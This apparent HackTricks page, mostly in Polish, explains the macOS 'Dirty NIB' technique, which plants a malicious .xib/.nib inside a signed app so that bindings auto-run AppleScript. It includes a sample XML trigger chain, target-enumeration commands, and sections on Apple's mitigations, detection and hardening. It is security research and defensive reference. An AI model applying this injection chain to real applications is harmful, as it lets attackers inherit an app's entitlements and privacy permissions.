# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB odnosi się do nadużywania plików Interface Builder (.xib/.nib) wewnątrz podpisanego pakietu aplikacji macOS w celu wykonania logiki kontrolowanej przez atakującego w procesie docelowym, a tym samym odziedziczenia jego entitlements i uprawnień TCC. Technika ta została pierwotnie opisana przez xpn (MDSec), a następnie uogólniona i znacząco rozszerzona przez Sector7, który omówił również mechanizmy Apple mające na celu ograniczenie tego problemu w macOS 13 Ventura i macOS 14 Sonoma.<sup>[[1]](#references)[[2]](#references)</sup> Informacje wprowadzające i pogłębione analizy znajdziesz w referencjach na końcu.

> TL;DR
> • Przed macOS 13 Ventura: zastąpienie MainMenu.nib danego pakietu (lub innego nib ładowanego podczas uruchamiania) mogło niezawodnie umożliwić process injection i często privilege escalation.
> • Od macOS 13 (Ventura), a także po ulepszeniach w macOS 14 (Sonoma): weryfikacja podczas pierwszego uruchomienia, ochrona pakietu, Launch Constraints oraz nowe uprawnienie TCC „App Management” w dużej mierze uniemożliwiają modyfikowanie nib po uruchomieniu przez niepowiązane aplikacje. Ataki mogą być nadal wykonalne w niszowych przypadkach (np. narzędzia tego samego dewelopera modyfikujące własne aplikacje albo terminale, którym użytkownik przyznał App Management/Full Disk Access).


## Czym są pliki NIB/XIB

Pliki Nib (skrót od NeXT Interface Builder) to serializowane grafy obiektów UI używane przez aplikacje AppKit. Współczesny Xcode przechowuje edytowalne pliki XML .xib, które podczas budowania są kompilowane do formatu .nib. Typowa aplikacja ładuje swój główny interfejs UI za pomocą `NSApplicationMain()`, który odczytuje klucz `NSMainNibFile` z pliku Info.plist aplikacji i tworzy instancje grafu obiektów w czasie wykonywania.

Najważniejsze elementy umożliwiające atak:
- Ładowanie NIB tworzy instancje dowolnych klas Objective-C bez wymagania zgodności z NSSecureCoding (loader nib firmy Apple korzysta z `init`/`initWithFrame:`, gdy `initWithCoder:` nie jest dostępne).
- Cocoa Bindings można wykorzystać do wywoływania metod podczas tworzenia instancji nib, w tym łańcuchów wywołań, które nie wymagają interakcji użytkownika.


## Proces Dirty NIB injection (z perspektywy atakującego)

Klasyczny przebieg sprzed Ventura:
1) Utwórz złośliwy plik .xib
- Dodaj obiekt `NSAppleScript` (lub inne klasy typu „gadget”, takie jak `NSTask`).
- Dodaj `NSTextField`, którego title zawiera payload (np. AppleScript lub argumenty polecenia).
- Dodaj jeden lub więcej obiektów `NSMenuItem` połączonych za pomocą bindings w celu wywoływania metod na obiekcie docelowym.

2) Automatycznie wyzwól działanie bez kliknięć użytkownika
- Użyj bindings do ustawienia target/selector elementu menu, a następnie wywołaj prywatną metodę `_corePerformAction`, aby akcja uruchomiła się automatycznie podczas ładowania nib. Eliminuje to konieczność klikania przycisku przez użytkownika.

Minimalny przykład łańcucha auto-trigger wewnątrz pliku .xib (skrócony dla przejrzystości):
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
To umożliwia wykonanie dowolnego AppleScript w procesie docelowym podczas ładowania nib.<sup>[[1]](#references)</sup> Zaawansowane łańcuchy mogą:
- Tworzyć dowolne klasy AppKit (np. `NSTask`) i wywoływać metody bez argumentów, takie jak `-launch`.
- Wywoływać dowolne selektory z argumentami będącymi obiektami za pomocą opisanego wyżej triku z bindingiem.
- Ładować AppleScriptObjC.framework w celu uzyskania dostępu do Objective-C, a nawet wywoływać wybrane API C.
- W starszych systemach, które nadal zawierają Python.framework, uzyskiwać dostęp do Pythona, a następnie używać `ctypes` do wywoływania dowolnych funkcji C (badania Sector7).<sup>[[2]](#references)</sup>

3) Replace the app’s nib
- Skopiuj target.app do lokalizacji z prawem zapisu, zastąp np. `Contents/Resources/MainMenu.nib` złośliwym nib i uruchom target.app. Przed systemem Ventura, po jednorazowej ocenie Gatekeeper kolejne uruchomienia wykonywały jedynie pobieżne kontrole podpisu, więc zasoby niebędące plikami wykonywalnymi (takie jak .nib) nie były ponownie weryfikowane.

Example AppleScript payload for a visible test:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## Nowoczesne zabezpieczenia macOS (Ventura/Monterey/Sonoma/Sequoia)

Apple wprowadziło kilka systemowych mechanizmów ograniczających, które znacząco zmniejszają skuteczność Dirty NIB w nowoczesnym macOS:<sup>[[2]](#references)</sup>
- Weryfikacja przy pierwszym uruchomieniu i ochrona bundle (macOS 13 Ventura)
- Przy pierwszym uruchomieniu dowolnej aplikacji (objętej kwarantanną lub nie) dokładne sprawdzenie sygnatury obejmuje wszystkie zasoby bundle. Następnie bundle zostaje chroniony: tylko aplikacje tego samego developera (lub aplikacje, którym zezwoliła na to dana aplikacja) mogą modyfikować jego zawartość. Inne aplikacje wymagają nowego uprawnienia TCC „App Management”, aby zapisywać w bundle innej aplikacji.
- Launch Constraints (macOS 13 Ventura)
- Aplikacji systemowych/aplikacji dołączonych przez Apple nie można kopiować w inne miejsce i uruchamiać; eliminuje to podejście „skopiuj do /tmp, zmodyfikuj, uruchom” w przypadku aplikacji systemowych.
- Ulepszenia w macOS 14 Sonoma
- Apple zaostrzyło App Management i naprawiło znane obejścia (np. CVE‑2023‑40450) opisane przez Sector7. Python.framework został wcześniej usunięty (macOS 12.3), co przerwało niektóre łańcuchy privilege-escalation.
- Zmiany w Gatekeeper/Quarantine
- Szersze omówienie zmian w Gatekeeper, pochodzeniu plików i procesie oceny, które wpłynęły na tę technikę, znajduje się na stronie wskazanej poniżej.

> Praktyczne znaczenie
> • W Ventura+ zazwyczaj nie można modyfikować pliku .nib aplikacji innego developera, chyba że proces ma App Management lub jest podpisany tym samym Team ID co aplikacja docelowa (np. narzędzia developerskie).
> • Nadanie powłokom/terminalom uprawnienia App Management lub Full Disk Access skutecznie ponownie otwiera tę powierzchnię ataku dla wszystkiego, co może wykonywać code w kontekście tego terminala.


### Omijanie Launch Constraints

Launch Constraints blokują uruchamianie wielu aplikacji Apple z lokalizacji innych niż domyślne, począwszy od Ventura. Jeśli korzystasz z procesów sprzed Ventura, takich jak kopiowanie aplikacji Apple do katalogu tymczasowego, modyfikowanie `MainMenu.nib` i jej uruchamianie, oczekuj, że zakończy się to niepowodzeniem w wersji >= 13.0.


## Enumerating targets and nibs (useful for research / legacy systems)

- Zlokalizuj aplikacje, których UI jest sterowany przez nib:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- Znajdź potencjalne zasoby nib w obrębie bundle:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- Dokładnie weryfikuj sygnatury kodu (operacja zakończy się niepowodzeniem, jeśli zmodyfikowano zasoby i nie wykonano ponownego podpisania):
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> Uwaga: We współczesnym macOS podczas próby zapisu do bundle innej aplikacji bez odpowiedniej autoryzacji zostaniesz również zablokowany przez bundle protection/TCC.


## Wskazówki dotyczące Detection i DFIR

- Monitorowanie integralności plików zasobów bundle
- Obserwuj zmiany mtime/ctime w `Contents/Resources/*.nib` oraz innych nie wykonywalnych zasobach zainstalowanych aplikacji.
- Unified logs i zachowanie procesów
- Monitoruj nieoczekiwane wykonywanie AppleScript wewnątrz aplikacji GUI oraz procesy ładujące AppleScriptObjC lub Python.framework. Przykład:
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- Proaktywne assessmenty
- Okresowo uruchamiaj `codesign --verify --deep` dla krytycznych aplikacji, aby upewnić się, że zasoby pozostają nienaruszone.
- Kontekst uprawnień
- Audytuj, kto/co ma uprawnienie TCC „App Management” lub Full Disk Access (szczególnie terminale i agenty zarządzające). Usunięcie tych uprawnień z shelli ogólnego przeznaczenia zapobiega prostemu ponownemu włączeniu manipulacji w stylu Dirty NIB.


## Hardening defensywny (developerzy i obrońcy)

- Preferuj programmatic UI lub ograniczaj to, co jest instancjonowane z nibów. Unikaj dołączania potężnych klas (np. `NSTask`) do grafów nibów oraz bindingów, które pośrednio wywołują selektory na dowolnych obiektach.
- Stosuj hardened runtime z Library Validation (jest to już standard we współczesnych aplikacjach). Chociaż samo w sobie nie powstrzymuje nib injection, blokuje łatwe ładowanie native code i zmusza attackerów do korzystania wyłącznie z payloadów skryptowych.
- Nie żądaj szerokich uprawnień App Management w narzędziach ogólnego przeznaczenia ani nie polegaj na nich. Jeśli MDM wymaga App Management, oddziel ten kontekst od shelli obsługiwanych przez użytkownika.
- Regularnie weryfikuj integralność bundle aplikacji i spraw, aby mechanizmy aktualizacji samoczynnie naprawiały zasoby bundle.


## Powiązane materiały w HackTricks

Dowiedz się więcej o Gatekeeper, quarantine i zmianach provenance wpływających na tę technikę:

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## Referencje

- [1] [xpn – DirtyNIB (oryginalny write-up z przykładem dotyczącym Pages)](https://blog.xpnsec.com/dirtynib/)
- [2] [Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files (April 5, 2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)

{{#include ../../../banners/hacktricks-training.md}}
